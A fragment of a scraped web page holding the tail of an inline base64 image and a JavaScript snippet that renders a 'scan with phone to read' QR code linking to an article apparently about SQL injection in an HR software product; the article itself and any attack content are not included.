h6U3uhaI/4W+HgB10nsCD/k07foxCqmziNunZC6Q2/gDx9708mKdZ3gKwg61rh86LHUgZGTNhZdxkJwjnwZeAxouFnyjnAT3V+A4Wq+04dP6PqIoHNgP7GKs7WA9TWWHHAMWP8/5PZmj6ffsmqH9/7sbwN3/ywG1gCfZKkPbFd3xhXBMTjHFJ7lJnaE4No1Xuvs/ao788F1a/7TDTmb4Fpsqc52YDXkbHdeEBs+9oKPEXScrQvGOJib6R9xObbgGtDxLDd5Fau+8vLh+bqpp/wY9DpAJIeYvCoIB2xvycC6qd/e7NHestKtR5j1Vx24w+GiEYarCJ/1ioE55RwZWAMdj7R7Hpyjufa212oM1gMaPjSgXeVg/2HSh6CupzXkI7bgxTuwGvLiBuynbw2B544ZWA/939n3xY/GOaJH8T0ffcW9RmPwmuRfMbAeOmaOmn+VqznP+NDnbw15psDS/twODA2B3i0Y/SwlV40wHFgvLgbmoqkIjkE/ZckTVq186HqN96YcWeXBOeJlNaaxrHJgfeXig2PQMTHViYV7hOA6yRMODXlU5F3j/5d1rYa8WSfbz+86LrK6Po1llQMfM+hY43tf+bLKg3MfccqTRSc/Fg5cCwg1RWD7nlCDMHKJZx7hjBNfLRphePkxOJ4LHAPWN/Xbmz2G37Lq+sCdq1z8XAXCcDME14CO0Sl3b9B1YD/6Gdb8xM84cE2Yf5BILnQd2E/9ijDGwBx0rDnxM1fGwnUP0S68ka2GvFEztJR2U9dAlmNUUfzeYDyOyanacDOsOnC9qqtx+WANoOFgwHDjTr1BXAhwHtDY5FVswbsDfJoLPAbu0fGZOsCWBx0TE64TMu7dS5nTm3pWps6dWXTQuw7H/kyf+tDzwkWfsTDcDKHXgM++cmPgWMZCMAfnmHmVc2TRCMH1qla8DBwD1sfe2+nj94PtHgK9S/Ccn2Wn+xlXTEwIrl/jMx+u6fa5miO2j10dJ1+YHPmxcEHwWoFQUwTaPSSC1BSue0h25U1wNeRNGpFltIbouDxjKTDDWR0Yj2rNBcdnudGBNdC/ZSf2CFMXeo1ZTnSz2BmXPOFMJ142i0FfU2vITLi439+BoSHQuwWj/x1L1JVyZNDnPJsLrDvTzGJ13lkcnqsL1sOItT44Xrn4dU1DQyJa+JodWA15zb4fzvqtDQEfSxixHsusBrou3AzBulojPjgGtFRg+KwP5prowEndg/Al+qxGYhVr0W9tSC28/OMdOIt8a0Nq1+OfTT6LJU+4j4Ovcui412is3L2J31s0e15jGOeAziV3hsrfW3R7XmPodb+1ISq+7Gs7sBrytf379uyhITlaR/inK4B+LMF+nSN1wTHomNhMn5gwcfkxcJ3EwGMgkk8IbB8IKpncyoF1cIzJE9bc+OBcxWNDQyJe+JodaA0Bdwuu4dlyoddI58/0NRa9MLx8GfS6+5ji4aDrxMvAXDRCMAcdpZUpfsWklc200OuC/Zmucq0hlVz+63ZgNeR1ez+d+T8AAAD//3WnI84AAAAGSURBVAMAZcy7sO5/x4QAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hjsoft-HrpService-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 